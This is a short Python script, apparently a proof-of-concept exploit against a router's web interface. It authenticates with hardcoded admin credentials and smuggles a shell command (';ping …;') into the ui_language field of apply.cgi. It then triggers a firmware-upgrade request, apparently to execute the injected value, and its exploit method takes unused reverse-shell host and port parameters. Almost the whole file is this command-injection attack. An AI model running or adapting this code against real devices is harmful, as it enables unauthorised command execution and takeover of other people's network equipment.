from dataclasses import dataclass
from typing import Tuple

import requests

import router_requests


@dataclass
class Router:
    host: str
    netmask: str
    creds: Tuple[str, str]

    def exploit(self, rev_shell_host: str, rev_shell_port: int):
        self._set_ui_language(';ping 192.169.1.100;')
        self._upgrade_firmware()

    def _set_ui_language(self, ui_language: str):
        req_query = router_requests.get_ui_language_query(ui_language, self.host, self.netmask)
        req = requests.post(f'http://{self.host}/apply.cgi', data=req_query, auth=self.creds)
        if not req.ok:
            raise ValueError(f'Failed to change ui_language. Request: {req}')

    def _upgrade_firmware(self):
        req_query = router_requests.get_upgrade_query()
        req = requests.post(f'http://{self.host}/upgrade.cgi', data=req_query, auth=self.creds)
        if not req.ok:
            raise ValueError(f'Failed to issue a firmware upgrade. Request: {req}')


def main():
    router = Router('192.169.1.1', '255.255.255.0', ('admin', '$kurt'))
    router.exploit('192.169.1.100', 5000)


if __name__ == '__main__':
    main()
